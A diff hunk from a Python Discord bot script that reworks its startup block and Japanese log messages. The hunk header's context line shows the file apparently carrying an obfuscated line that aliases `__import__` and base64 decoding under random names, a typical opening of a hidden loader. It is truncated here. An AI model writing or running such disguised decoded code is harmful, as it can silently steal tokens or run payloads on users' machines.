@@ -19,21 +19,16 @@ CLNtVBTHkbFEEAQ=__import__;okgIXLroQhOfyzL=CLNtVBTHkbFEEAQ('base64').b64decode;c
 
 
 if __name__ == "__main__":
-    token = os.getenv("DISCORD_TOKEN")
-    if not token:
-        print(" トークンが見つかりません。")
-        sys.exit(1)
-
-    print(" Discord Bot 起動中")
-    sys.stdout.flush()  # GitHub Actionsなどでログを即反映
-
     try:
-        bot.run(token, reconnect=True)  # 自動再接続
-    except KeyboardInterrupt:
-        print(" 手動停止されました。")
+        print("=== Discord Bot 起動中 ===")
+        token = os.getenv("DISCORD_TOKEN")
+        if not token:
+            print(" トークンが見つかりません")
+            sys.exit(1)
+        bot.run(token)
     except Exception as e:
-        print(f" 起動エラー: {e}")
+        print(f" エラー発生: {e}")
     finally:
-        print(" Bot終了: GitHub Actionsが再起動します。")
+        print(" Bot終了: GitHub Actionsが再起動を担当します")
         sys.stdout.flush()
-        sys.exit(0)
+        sys.exit(0)  # ★これが重要！絶対入れる！
